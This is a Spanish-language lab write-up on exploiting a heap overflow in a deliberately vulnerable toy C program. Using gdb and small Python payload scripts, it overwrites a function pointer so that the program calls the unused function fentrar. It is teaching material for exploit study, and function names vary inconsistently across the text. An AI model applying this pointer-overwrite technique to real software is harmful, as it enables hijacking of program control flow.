# HeapOverflow Carlos Dominguez
En esta práctica seguiremos los siguientes pasos para lograr un heap-overflow que nos permite abrir una foto.

Empecemos creando y ejecutando el contenedor Docker donde se harán las pruebas:
```
docker build -t heap .
docker run --rm -it --name heap heap
```
Una vez estamos dentro podemos analizar un poco el código vulnerable, el código que vaamos a romper:
```
int main(int argc, char **argv) {
    struct sdata *smidat;
    struct sfp *f;

    smidat = malloc(sizeof(struct sdata));
    f = malloc(sizeof(struct sfp));
    f->fp = fesperofuera;

    printf("data: está en [%p], el puntero fp está en [%p]\n", smidat, f);

    strcpy(smidat->buffer, argv[1]);

    f->fp();

    free(smidat);
    free(f);

    return 0;
}
```
Vemos que en ningún lugar del main vamos a llamar a la función esta
```
void fentrar() {
    printf("Pasando\n");
}
```
De forma que nuestra intención inicial como atacantes va a ser concseguir la ejecución de esta. Otro detalle que debemos destacar es que vamos a tener un struct que almacena una cadena de carácteres de tamaño 64 bytes, de forma que vamos a ver que pasa  en una ejecución normal vs una ejecución que la desborde:
![image](https://github.com/user-attachments/assets/ccc39f58-8e96-48d2-9c69-67d6398bb735)

Vemos que en la ejecución normal llegamos al final del programa ejecutando todo sin problemas, pero al forzar el overflow vemos que al llegar a la función
```
strcpy(smidat->buffer, argv[1]);
```
El sistema nos reporta que hemos accedido a una posición fuera de nuestro rango con
```
Segmentation fault (core dumped)
```
Por otro lado, destaquemos lo que hace el otro struct que almacenamos en el heap. Este guarda un puntero a una función, de forma que en el main se usa para que apunte a la función espero_fuera y luego llamar a esta desde el puntero.

Ahora vamos a ejecutar un debugger (gdb) para analizar el comportamiento de este programa:
```
gdb ./heapexample
```
Colocamos un break point en el punto en el que se llama a la función espero_fuera desde el puntero f:
![image](https://github.com/user-attachments/assets/b05b7378-974a-4a6b-a498-de59c007f942)

Tras esto, vamos a lanzar el comando
```
info proc map
```
Que nos muestra información sobre el proceso en ejecución. En concreto busacamos ver como se está organizando la memoria:
![image](https://github.com/user-attachments/assets/cba2b7e9-10ed-4910-a753-1099d54a5bcf)

En concreto, buscamos analizar el estado del heap, que en mi caso se encuentra entre las siguientes direcciones de memoria
```
Start Addr         End Addr    Size           Offset objfile
0x405000           0x426000    0x21000        0x0 [heap]
```
Ahora vamos a mostrar en detalle el contenido de esta zona de memoria, para ello ejecutamos:
```
x/120x 0x405000 
```
Donde el primer argumento expresa cuantas direcciones vamos a analizar y el segundo desde que posición lo haremos:
![image](https://github.com/user-attachments/assets/7c62b78d-ea3e-4ed1-bda8-f2f4a869f2de)

Aquí deberiamos buscar la cadena que hemos introducido "XXXX" que en hexadecimal sería "0x58585858", pero no la vemos.
Entonces vamos a aumentar el tamaño de direcciones que checkeamos:
```
x/240x 0x405000 
```
Con resultado: 
![image](https://github.com/user-attachments/assets/47d34e3b-5f8e-4d77-a450-71df0be9c8f7)

Donde ya podemos ver la cadena que buscabamos, así como la posición en la que comienza la función espera_fuera:
![image](https://github.com/user-attachments/assets/0f8903e0-2118-46a6-977b-e7b2bc6b40cf)

Para ubicar mejor donde empieza la función usaremos:
```
disass fesperofuera
```
![image](https://github.com/user-attachments/assets/134b4512-1d89-4c09-b03b-1ecde7b49cdc)

Ahora que tenemos la información que buscabamos ya podemos salir del debbuger con 
```
q
```

Ahora vamos a ejecutar un pequeño programa de python que nos deje analizar el comportamiento de la memoria ante un desbordamiento:
```
program.1:
#!/usr/bin/python3
print('X' * 90)
```

Antes de nada vamos a darle permisos y probar que funciona como es debido:
![image](https://github.com/user-attachments/assets/a91a2aab-a6de-4803-b5e0-0f7f9c9358ea)

Una vez vemos que funciona vamos a ejecutarlo para que nos de la entrada esperada de nuestro código vulnerable:
```
./heapexample $(./pp1)
```
Donde nuevamente vemos que hay un problema por desbordamiento:
![image](https://github.com/user-attachments/assets/5129e284-6665-4e61-b118-577ce1e6ff00)

Ahora veamos dentro de gdb que esta sucediendo (ejecutamos todos los pasos anteriores hasta justo antes de hacer run XXXX) ejecutando 
```
run $(program.1)
```
y volvemos a analizar el heap:
![image](https://github.com/user-attachments/assets/a34704fd-379a-45d8-b6a3-154d8f9c418b)

Viendo que hemos sobreescrito la primera instrucción de fesperandofuera.

¿Y como podríamos aprovechar esto?

Para ellos, vamos a volver a ver como se organiza el heap:
![image](https://github.com/user-attachments/assets/0d91f6a3-bfa4-4d16-bf19-cb0283f072f9)

Donde vemos que el número máximo de carácteres que podemos insertar es 
```
0x4052f0 (donde empieza fesperofuera) - 0x4052a0 (donde empieza el buffer) = 80
```

Por tanto, vamos a ver que pasa al introducir una cadena de este tamaño con el siguiente programa de python:
```
program.2:
#!/usr/bin/python3
print('X' * 70 + 'YAYBYCYDYEYFYG')
```
De forma que deberíamos prestar especial atencion a la última parte de la cadena "YFYG" = 0x47594659. Vamos a ver donde se sobreescribe esto ejecutando:
```
gdb -q ./heapexample
(gdb) run $(./program.2)
```
Y analicemos la memoria en el heap:

![image](https://github.com/user-attachments/assets/34b01a17-d6d2-488f-a2d5-2de408f73f66)

Donde podemos ver que hemos sobreescrito la zona de la funcion fesperofuera con la cadena "0x47594659" = YFYG (little endian).

Por otro lado, tras ejecutar con esta entrada si observamos los registros del sistema con:
```
info registers
```
vemos que hemos sobreescrito el RIP con esta cadena:
![image](https://github.com/user-attachments/assets/32f202a6-1c07-4c59-8ab4-3aeb843ac220)

Ahora vamos a refinar esto un poco más con el siguiente programa de Python (observar que "CDEF" = 0x46454443):
```
program.3:
#!/usr/bin/python3
print('X' * 80 + 'CDEF')
```
Donde rellenamos los primeros registros de la misma forma siempre, ya que solo nos importa sobreescribir el registro RIP. De esta forma, repetimos los pasos anteriores y vemos que pasa en el heap:
```
gdb -q ./heapexample
(gdb) run $(./program.3)
```
![image](https://github.com/user-attachments/assets/4c45454c-09ab-4534-9946-2ea11bf6a6d5)

También vemos lo que sucede con los registros:
```
info registers
```
![image](https://github.com/user-attachments/assets/38a0f883-0836-4244-b485-4b103762555c)

¿Cómo podríamos aprovechar esto?

Vamos a intentar ejecutar la función "fentrar" escribiendo la instrucción de inicio de esta donde debería empezar la función "fesperofuera". Para ello, primero veamos el código ensamblador de esta función con:
```
gdb -q ./heapexample
(gdb) disass fentrar
```

![image](https://github.com/user-attachments/assets/17cdf647-e044-405c-96ba-a982fecbd9fa)

De forma que si cogemos la primera instrucción de fentrar y la metemos en el RIP con el programa de python:
```
program.4:
#!/usr/bin/python3
#Seria lo ideal
print('X' * 80 + '\xba\x11\x40\x00')
#Por problemas con el caracter x00 podemos hacer
print('X' * 79 + '\xba\x11\x40')
```

Podemos llegar a visualizar lo siguiente al ejecutar
```
./heapexample $(./program.4)
```
![image](https://github.com/user-attachments/assets/2ec6200c-be3a-4a96-9cb5-cb225e761c87)

Viendo que hemos conseguido ejecutar nuestro código (fentrar que imprime "Pasando") en vez de la función fesperofuera.




